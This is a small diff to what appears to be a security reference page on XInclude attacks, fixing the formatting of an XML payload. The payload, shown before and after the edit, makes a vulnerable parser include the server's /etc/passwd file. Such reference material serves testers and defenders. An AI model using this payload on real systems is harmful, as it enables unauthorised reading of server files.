@@ -152,8 +152,7 @@ XInclude Attacks
 
 Payload:
 
-<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include parse="text" href="file:///etc/passwd"/>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 
 * This payload can be located anywhere in the XML document.
 
